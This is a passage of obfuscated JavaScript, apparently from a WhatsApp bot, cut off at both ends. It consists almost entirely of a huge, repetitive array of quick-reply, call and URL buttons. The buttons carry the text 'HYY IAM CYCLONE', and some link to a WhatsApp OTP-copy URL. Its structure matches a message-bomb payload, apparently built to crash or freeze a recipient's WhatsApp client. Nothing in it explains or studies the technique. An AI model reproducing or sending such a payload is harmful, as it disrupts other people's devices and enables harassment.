08),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x1